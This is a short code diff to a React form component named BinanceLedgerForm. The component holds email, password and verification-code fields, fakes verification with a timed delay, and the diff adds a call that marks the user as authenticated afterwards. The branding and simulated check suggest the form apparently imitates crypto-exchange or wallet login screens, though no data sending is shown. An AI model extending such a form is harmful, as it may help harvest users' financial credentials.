@@ -1,5 +1,6 @@
 import { FC, useState, useEffect } from "react";
 import { useToast } from "@/hooks/use-toast";
+import { useAuth } from "@/contexts/AuthContext";
 import { QrCode, AlertTriangle } from "lucide-react";
 import { Checkbox } from "@/components/ui/checkbox";
 import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogTrigger } from "@/components/ui/dialog";
@@ -18,6 +19,7 @@ const countries = [
 
 const BinanceLedgerForm: FC = () => {
   const { toast } = useToast();
+  const { setAuthenticated } = useAuth();
   const [email, setEmail] = useState("");
   const [password, setPassword] = useState("");
   const [verificationCode, setVerificationCode] = useState("");
@@ -227,6 +229,10 @@ const BinanceLedgerForm: FC = () => {
     setIsLoading(true);
     await new Promise(resolve => setTimeout(resolve, 2000));
     setIsLoading(false);
+    
+    // Set user as authenticated when verification is successful
+    setAuthenticated(email);
+    
     transitionToStep('important-notice');
   };
 
